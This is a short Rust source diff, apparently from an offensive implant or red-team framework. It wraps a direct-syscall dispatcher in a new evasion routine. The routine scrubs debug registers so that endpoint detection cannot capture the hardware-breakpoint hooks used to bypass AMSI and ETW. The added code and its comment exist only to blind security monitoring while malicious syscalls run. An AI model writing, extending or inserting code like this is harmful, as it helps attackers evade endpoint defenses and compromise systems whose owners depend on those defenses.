@@ -1126,6 +1126,21 @@ unsafe fn gadget_is_valid(addr: usize, len: usize) -> bool {
 #[doc(hidden)]
 #[inline(never)]
 pub unsafe fn do_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
+    // Scrub debug registers (Dr0/Dr1) around the syscall to prevent EDR
+    // from capturing AMSI/ETW hardware breakpoint addresses via
+    // NtGetContextThread or kernel-mode trap frame inspection during
+    // the kernel transition.
+    crate::evasion::with_scrubbed_debug_regs(|| {
+        do_syscall_inner(ssn, gadget_addr, args)
+    })
+}
+
+/// Inner implementation of `do_syscall` — platform-specific syscall dispatch.
+/// Called with debug registers already scrubbed by the outer wrapper.
+#[cfg(windows)]
+#[doc(hidden)]
+#[inline(never)]
+unsafe fn do_syscall_inner(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
     #[cfg(target_arch = "x86_64")]
     {
         let a1 = args.get(0).copied().unwrap_or(0);
